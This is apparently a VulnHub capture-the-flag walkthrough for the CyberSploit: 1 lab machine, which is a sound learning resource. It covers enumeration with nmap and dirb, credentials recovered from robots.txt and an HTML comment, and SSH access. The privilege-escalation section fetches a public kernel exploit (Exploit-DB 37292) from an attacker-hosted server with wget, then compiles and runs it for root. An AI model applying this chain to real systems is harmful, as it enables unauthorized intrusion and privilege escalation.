# CyberSploit: 1 (VulnHub)

## Overview

**CyberSploit: 1** is a beginner-friendly VulnHub machine that focuses on web enumeration, information disclosure, SSH authentication, Linux enumeration, and kernel-based privilege escalation. The challenge demonstrates how hidden web content, exposed credentials, and an outdated Linux kernel can be chained together to achieve complete system compromise.

The machine provides hands-on experience with reconnaissance, web application enumeration, credential discovery, SSH access, local privilege escalation, and post-exploitation techniques.

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | CyberSploit: 1 |
| Platform | VulnHub |
| Difficulty | Easy |
| Target OS | Ubuntu Linux |
| Attacker Machine | Kali Linux |
| Objective | Gain Root Access and Retrieve All Flags |

## Skills Demonstrated

- Network Discovery
- Host Enumeration
- Service Enumeration
- Nmap Scanning
- Web Enumeration
- Directory Enumeration
- Information Disclosure
- HTML Source Code Analysis
- Base64 Decoding
- Binary Decoding
- SSH Authentication
- Linux Enumeration
- Kernel Enumeration
- Exploit Research
- Local Privilege Escalation
- Linux Kernel Exploitation
- Post Exploitation

## Tools Used

- ARP-Scan
- Nmap
- DIRB
- Base64 Decoder
- SSH
- GCC
- Python HTTP Server
- Exploit-DB
- Linux Shell Commands
- Kali Linux

## Attack Methodology

1. Discover the target machine.
2. Enumerate open services.
3. Perform web enumeration.
4. Discover hidden directories.
5. Decode Base64 data to recover Flag1.
6. Inspect HTML source for hidden credentials.
7. Authenticate via SSH.
8. Decode binary data to recover Flag2.
9. Enumerate the Linux kernel.
10. Identify a vulnerable kernel exploit.
11. Transfer and compile the exploit.
12. Escalate privileges to root.
13. Retrieve the final flag.

## Network Discovery

Identify active hosts:

```bash
sudo arp-scan -l
```

Result:

```text
192.168.1.106
```

The target machine was successfully identified on the local network.

## Open Services Identified

Perform service enumeration:

```bash
sudo nmap -A -sV -sC 192.168.1.106 --min-rate 10000
```

### Nmap Results

| Port | Service | Version |
|------|----------|---------|
| 22 | SSH | OpenSSH 5.9p1 |
| 80 | HTTP | Apache 2.2.22 |

HTTP Title:

```text
Hello Pentester!
```

The target exposed SSH and a web server for further enumeration.

## Website Enumeration

Browse to:

```text
http://192.168.1.106
```

The homepage contained no obvious credentials, requiring further enumeration.

## Directory Enumeration

Run DIRB:

```bash
dirb http://192.168.1.106/
```

Interesting discoveries:

```text
robots.txt
hacker
```

The `robots.txt` file contained an encoded string.

## Flag 1 Discovery

Access:

```text
http://192.168.1.106/robots.txt
```

The page contained a Base64-encoded string.

Decode using:

```bash
echo "<base64_string>" | base64 -d
```

Recovered flag:

```text
cybersploit{youtube.com/c/cybersploit}
```

## Initial Access

Inspect the webpage source code.

Hidden HTML comment:

```html
<!-- username: itsskv -->
```

Recovered credentials:

```text
Username: itsskv
Password: cybersploit{youtube.com/c/cybersploit}
```

Authenticate via SSH:

```bash
ssh itsskv@192.168.1.106
```

Successful login provided shell access.

## User Enumeration

Inspect the home directory:

```bash
ls
```

Interesting file:

```text
flag2.txt
```

Display contents:

```bash
cat flag2.txt
```

The file contained binary-encoded data.

## Flag 2 Discovery

Convert binary to text.

Recovered flag:

```text
cybersploit{https://t.me/cybersploit1}
```

User enumeration completed successfully.

## Kernel Enumeration

Identify the kernel version:

```bash
uname -a
```

Output:

```text
Linux 3.13.0-32-generic
```

Researching the kernel version identified a public privilege escalation exploit.

Exploit:

```text
Exploit-DB 37292
```

## Privilege Escalation

Host the exploit:

```bash
python3 -m http.server 80
```

Download on the target:

```bash
wget http://<attacker-ip>/37292.c
```

Compile:

```bash
gcc 37292.c -o exploit
```

Execute:

```bash
./exploit
```

Verify privileges:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root)
```

Root access was successfully obtained.

## Root Flag

Navigate to:

```bash
cd /root
```

Read:

```bash
cat finalflag.txt
```

Recovered flag:

```text
cybersploit{Z3X21CW42C4 many many congratulations !}
```

Root compromise was successfully achieved.

## Vulnerabilities Identified

### 1. Information Disclosure

Sensitive information was exposed through `robots.txt` and HTML comments.

### 2. Weak Credential Management

SSH credentials were recoverable from publicly accessible web content.

### 3. Insecure Web Configuration

Hidden files and page comments disclosed valuable attack information.

### 4. Outdated Linux Kernel

The vulnerable kernel allowed local privilege escalation using a publicly available exploit.

### 5. Kernel Privilege Escalation

The system was vulnerable to Exploit-DB 37292, allowing full root compromise.

## Attack Chain Summary

- Host Discovery using ARP-Scan
- Service Enumeration using Nmap
- Web Enumeration
- Directory Enumeration using DIRB
- Base64 Decoding
- HTML Source Analysis
- SSH Authentication
- Binary Decoding
- Kernel Enumeration
- Exploit-DB Research
- Local Kernel Exploitation
- Root Access
- Final Flag Retrieval

## Security Recommendations

- Remove sensitive information from HTML comments.
- Avoid exposing sensitive data in `robots.txt`.
- Use strong, unique SSH credentials.
- Disable unnecessary web content.
- Keep Linux kernels fully updated.
- Apply security patches promptly.
- Restrict local compilation tools where appropriate.
- Perform regular vulnerability assessments.
- Monitor for privilege escalation attempts.
- Conduct periodic penetration testing.

## Key Learning Outcomes

- Web enumeration frequently uncovers hidden attack paths.
- Information disclosure can directly expose credentials.
- Base64 and binary encoding should never be relied upon for security.
- SSH authentication becomes dangerous when credentials are exposed.
- Linux kernel version enumeration is essential during post-exploitation.
- Public kernel exploits remain highly effective against unpatched systems.
- Patch management significantly reduces privilege escalation risks.

## Flags

### Flag 1

```text
cybersploit{youtube.com/c/cybersploit}
```

### Flag 2

```text
cybersploit{https://t.me/cybersploit1}
```

### Final Flag

```text
cybersploit{Z3X21CW42C4 many many congratulations !}
```

## Conclusion

CyberSploit: 1 is an excellent beginner-level VulnHub machine that teaches reconnaissance, web enumeration, information disclosure, credential discovery, SSH authentication, Linux kernel enumeration, and privilege escalation. The machine demonstrates how multiple low-severity weaknesses can be chained together into complete system compromise, emphasizing the importance of secure coding practices, proper credential management, and timely patch management.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
